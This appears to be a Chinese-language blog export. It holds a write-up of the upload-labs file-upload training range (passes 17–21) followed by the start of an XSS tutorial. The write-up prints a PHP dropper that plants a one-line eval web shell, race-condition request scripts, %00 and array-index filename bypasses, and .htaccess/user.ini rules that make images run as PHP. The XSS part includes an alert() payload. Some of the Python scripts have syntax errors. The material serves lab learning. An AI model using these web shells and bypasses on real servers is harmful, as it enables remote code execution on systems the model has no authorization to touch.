<h2 id="法二条件竞争"><a href="#法二条件竞争" class="headerlink" title="法二条件竞争"></a>法二条件竞争</h2><p>这关我们还有第二个方法就是利用条件竞争，我们审查代码可以发现该代码是先将我们上传的图片马进行一次保存，然后再渲染，最后才用unlink代码进行删除，所以我们可以尝试使用条件竞争来进行绕过，<br>原理为，再短时间内向服务器发生多个图片马，由于代码的执行是需要时间的，而该代码因为没有锁，导致了可以同时被执行，也就导致了该图片马虽然被删除，但是还存在前一小端时间内传入的图片马，也就是图片被删除的同时又新的图片马被保存。而且第一次保存并没有对文件名进行随机数处理所以我们可以产生使用bp进行多线程发生图片马，之后尝试再浏览器中包含图片马，该图片马就有可以被执行。我们可以用如下的图片马<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;..upload/muma.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>这个代码的意思是使用写入方式打开文件muma.php如果目录下没有muma.php fopen()就会创建一个muma.php的空文件，而fputs是将<code>&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;</code>写入muma.php文件所以只要运行该代码就会在upload下导入一个muma.php文件下面写着一句话木马<br>我们使用多线程爆破可以使用bp的intruder模块来进行爆破，我们将抓到的包发到intruder，清空payload的位置，之后将payload类型设置为null进行爆破多线程发包<br><img src="/2023/12/15/upload-labs/17-2.png" class="" title="Alt text"><br>在发包的同时我们使用python来打开一个url，该url就是文件包含的url这样只要成功打开url就可以将<code>&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;</code>写入到muam.php里了代码如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.32.1/upload-labs/include.php?file=upload/muma.jpg&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span></span><br><span class="line">    html=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;warning&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(html.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><br>在开始多线程发包同时在打开脚本。<br>我在网上看是有人成功的，但是当我使用include包含时回发生报错，有可能是读写权限的原因</p>
<h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析源码<br>我们可以发现该代码是先将上传的文件用move_uploaded_file()将发送的文件先保存在服务器上然后在检测其文件后缀，如果后缀错误再使用unlink删除文件。<br>我们可以看出这道题目我们需要使用条件竞争来写。我们可以使用bp发送大量文件，服务器刚删除便上传一个php文件而我们可以使用上一题一样的php文件代码，<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;..upload/muma.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>我们只要能在url上访问到该php文件，服务器便会执行该文件，这样就会再上传目录下生成一个muma.php内容为<code>&lt;?php @eval($_POST[lisien11]);phpinfo();?&gt;</code>的php文件。<br>同意我们可以使用python脚本来访问该文件<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=http://<span class="number">192.168</span><span class="number">.32</span><span class="number">.1</span>/upload-labs/upload/<span class="number">2.</span>php</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span></span><br><span class="line">    html=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure><br><img src="/2023/12/15/upload-labs/18-1.png" class="" title="Alt text"><br><img src="/2023/12/15/upload-labs/18-2.png" class="" title="aa"><br>再进行发包同时打开脚本，可以发现再文件夹下成功出现了muma.php<br><img src="/2023/12/15/upload-labs/18-3.png" class="" title="Alt text"></p>
<h1 id="poss-19"><a href="#poss-19" class="headerlink" title="poss-19"></a>poss-19</h1><p>这道题目我们进行代码审查，发现这道题目的主要步骤为，检查后缀，保存文件，重命名文件，那么这道题目也可以使用条件竞争做法与上题相似只是脚本有些许不同</p>
<h1 id="法一条件竞争"><a href="#法一条件竞争" class="headerlink" title="法一条件竞争"></a>法一条件竞争</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.32.1/upload-labs/include.php?file=upload/muma.jpg&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span></span><br><span class="line">    html=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;warning&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(html.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="poss-20"><a href="#poss-20" class="headerlink" title="poss-20"></a>poss-20</h1><p>pathinfo(path,options):<br>作用：以数组的形式返回文件路径的信息。<br>语法：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">path  必需。规定要检查的路径。</span><br><span class="line">process_sections  可选。规定要返回的数组元素。默认是 all。</span><br><span class="line">可能的值：</span><br><span class="line">PATHINFO_DIRNAME - 只返回 dirname（所在路径）</span><br><span class="line">PATHINFO_BASENAME - 只返回 basename（文件名）</span><br><span class="line">PATHINFO_EXTENSION - 只返回 extension（后缀名）</span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以POST方法控制文件名字。<br>我们可以看到一个保存的函数move_uploaded_file()这个函数可以使用%00截断绕过，还会忽略文件尾部的/.我们可以再文件尾巴上传后缀为php/.或php%00来绕过</p>
<h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$_FILES[‘upload_file’]<br>name: 上传文件的名称，即用户在本地计算机上选择的文件名。<br>type: 上传文件的 MIME 类型。<br>tmp_name: 上传文件被存储在服务器上的临时文件名。<br>error: 上传过程中的错误码。<br>size: 上传文件的大小，以字节为单位。<br>empty()检查是否为空为空返回True<br>expload()将字符串以特定字符分割成多个数组。如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>))</span><br></pre></td></tr></table></figure><br>将<code>$file</code>转为小写后以.为分隔符来将字符串分割保存再数组中，若<code>$file=llll.SSS.ee</code><br>会变为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$name[0]=&gt;llll</span><br><span class="line">$name[1]=&gt;sss</span><br><span class="line">$name[2]=&gt;ee</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br></pre></td></tr></table></figure><br> 这段代码我们都可以看出来，是对file变量进行赋值，利用了三目运算符，如果有使用POST向save_name传值那么file就会被赋值为$_POST[‘save_name’]。<br> 之后将该字符串分割为数组，之后进行了一次判断，数组最后的一个字符串是否在白名单里能寻找到，最后将文件保存，我们重点分析一下文件上传的路径<br>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">$img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br></pre></td></tr></table></figure><br>  该代码将file_name与UPLOAD_PATH进行拼接成了文件上传路径，file_name的命名是将file数组的第一个与以数量减一为下标的数组元素进行拼接。<br>  那么我们就可以将POST上传的内容改为数组，那么就可以绕过expload()函数那么我们只要上传一个有两元素，第二个下标为2的数组，那么这就会导致在<code>end($file)</code>时返回的时file[2]但是<code>$file[count($file) - 1]</code>的返回值为file[1]二这个元素我们没有上传，那么该值就为空，那么file_name就变为了<code>reset($file)</code>也就是第一个元素，也就下标为0的元素<br>  <img src="/2023/12/15/upload-labs/21-1.png" class="" title="Alt text"><br>  我们只要使用bp抓包传入数组，元素有两个没有下标1，那么就可以成功绕过。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  这个靶场也已经刷完了，这个靶场给我的感觉就是，代审，代审，还是tm的代审。<br>  在刷这个靶场的时候有一大堆不认识的函数，而且所有漏洞基本是代审出来的。在刷完这个靶场后感觉自己代审能了得到了提高。也认识了很多绕过的方法下面是总结</p>
<h2 id="一般过滤函数"><a href="#一般过滤函数" class="headerlink" title="一般过滤函数"></a>一般过滤函数</h2>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  后端过滤一般用到的函数:</span><br><span class="line">trim()去除字符串两边的空格 </span><br><span class="line">deldot()删除文件名末尾的点号 </span><br><span class="line">strrchr()反向截取字符串 </span><br><span class="line">strtolower()转化为小写  </span><br><span class="line">str_ireplace()替换字符串中的内容 </span><br><span class="line">substr()获取子字符串 </span><br><span class="line">strrpos()获取字符串的位置信息</span><br><span class="line">fopen()打开文件 </span><br><span class="line">fread()读取文件 </span><br><span class="line">unpack()函数从二进制字符串对数据进行解包</span><br></pre></td></tr></table></figure>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>  1.前端绕过也是最简单的绕过，一般只要禁用前端代码，和使用bp抓包便可以绕过<br>  2.MIME绕过，MIME在向后端发送文件类型的方式是，使用响应头Content-type所以可以使用bp抓包直接修改该请求头的内容<br>  3.%00截断绕过，在我们可以操控上传路径的时候可以使用该方法进行绕过，原理为在上传时将后面的路径截断。若可以传值为POST传值需要将%00使用url解码<br>  4.大写绕过，在没有将后缀大写转换成小学这个操作且匹配函数不可以进行对大小写不敏感的匹配时使用，如在遇到in_array函数时由于该函数是直接匹配是否在数组内导致其无法区分大小写。<br>  5.双写绕过，如果过滤函数为替换函数如ireplace这种函数，且将关键字转换为空时可以使用双写进行绕过，基本原理与sql注入时双写绕过相似<br>  6.点空格绕过，当删除.和空格的函数只会进行一次检测时，我们可以使用点空格绕过在后缀的后面加入<code>. .</code>会因为，没有完全删除<code>.</code>导致其无法截到真正的后缀使其绕过<br>  7.点绕过，空格绕过当过滤时缺少删除点和空格的函数时我们可以使用该绕过。<br>  8.当过滤十分完善无法直接上传php文件但是存在文件包含漏洞时我们可以使用文件包含图片马来获取shell<br>  9.二次渲染使用gif图片来绕过，绕过存在文件包含漏洞可以尝试条件竞争，在使用文件包含漏洞来包含图片马来植入php<br>  10.条件竞争,由于文件在上传后被短暂保存后才进行验证删除，且没有锁导致可以使用条件竞争<br>  11.<code>.htaccess文件和user.ini</code>这两个文件可以配置php的一些配置导致我们上传的jpg文件可以被当成php文件执行代码如下</p>
<p>  将jpg文件当成php文件执行<br>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><br>  将文件名含有php的文件当成php文件执行<br>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddHandler php5-script php</span><br></pre></td></tr></table></figure><br>  指定名称的用php代码执行<br>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &lt;FilesMatch &quot;muam&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><br>下面时user.ini文件的<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepand_file=muma.jpg</span><br></pre></td></tr></table></figure><br>作用是将muma.jpg文件写的内容加到所以php文件下。<br>13，<code>$::DATA</code>绕过由于windows会自动省略该字符串所以在上传后<code>.php::$DATA</code>变为.php</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>靶场</category>
        <category>upload</category>
      </categories>
      <tags>
        <tag>top10</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>xss注入</title>
    <url>/2024/01/08/xss%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>xssS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
<p>​ xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。</p>
<h1 id="xss的原理"><a href="#xss的原理" class="headerlink" title="xss的原理"></a>xss的原理</h1><p>说起xss感觉和sql注入很像，xss是将一些恶意代码嵌入前端代码中，当用户浏览该网页时就会触发该恶意语句，一般恶意语句为js代码。<br>例如一个留言板没有对用户输入的内容进行过滤这就会导致单黑客在留言版里输入一些恶意语句时会被后端保存在数据库中，当有用户浏览该留言板时，后端代码会将该恶意语句输出到web页面上导致用户执行该代码。</p>
<h1 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h1><p>1.HTML标签之间<br><code>&lt;div&gt;</code>：可以直接写入JS，web会直接执行<br><code>&lt;title&gt;``&lt;iframe&gt;</code>等包含htmlEncode功能的标签：先闭合标签，再写入JS</p>
<p>2.HTML标签之内<br>插入点在value内，type不为hidden：由于web不会执行在value值内的JS代码，因此要使JS从Value中跳出。可以采用闭合标签等多种方法。<br>插入点在value内，type为hidden：由于标签内容不可显示，这时可以闭合标签或者插入新的type（有两个相同type时第二个失效）。</p>
<p>3.其它情况<br>属性可执行伪协议：直接输入JavaScript:脚本内容<br>eval()：会直接执行JS语句，因此可以直接输入脚本内容<br>在JS代码中插入：闭合标签或者属性</p>
<h1 id="xss类型"><a href="#xss类型" class="headerlink" title="xss类型"></a>xss类型</h1><p>1.反射性<br><img src="/2024/01/08/xss%E6%B3%A8%E5%85%A5/3.png" class="" title="Alt text"><br>反射性xss漏洞，就是通过请求参数来使页面输出相应的内容也就是将js语句传到了后端在由后端传到前端，反射型xss是一次性的也就是不会被存储<br>如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">前端</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">后端<span class="number">1</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[name];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>像这样的代码当我们在输入框输入<code>&lt;script&gt; alert(&quot;hack&quot;) &lt;/script&gt;</code>时就会弹出窗口</p>
<h1 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h1><img src="/2024/01/08/xss%E6%B3%A8%E5%85%A5/2.png" class="" title="Alt text">
<p>将黑客输入的代码存储到数据库中。<br>当用户打开网页时将代码输出到用户的web里导致该代码被浏览器解析执行。这就是存储型漏洞<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">前端</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">        name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    &lt;/body</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
